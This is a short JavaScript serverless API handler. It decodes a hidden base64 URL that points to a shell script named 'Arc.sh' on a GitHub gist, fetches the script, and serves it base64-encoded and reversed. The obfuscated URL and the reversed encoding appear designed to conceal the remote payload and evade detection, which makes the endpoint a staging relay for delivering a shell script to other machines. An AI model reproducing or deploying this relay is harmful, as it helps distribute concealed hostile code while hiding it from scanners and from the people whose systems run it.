export default async function handler(req, res) {
  const _G = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9WYW5uWEQwL2U3YmEzNGYxZDY0MWQ0MGYyMDlmYzBiZjg5OWJjNjZmL3Jhdy9hNjIzNzk5ZjkwZGU5MTIwZDkwNGNiNWNlNmYwZGNhOWVmMDkwOTM0L0FyYy5zaA==";
  const _U = Buffer.from(_G, 'base64').toString('utf8');
  try {
    const _R = await fetch(_U);
    const _S = await _R.text();
    const _O = Buffer.from(_S).toString('base64').split('').reverse().join('');
    res.status(200).send(_O);
  } catch (e) {
    res.status(500).send("");
  }
}
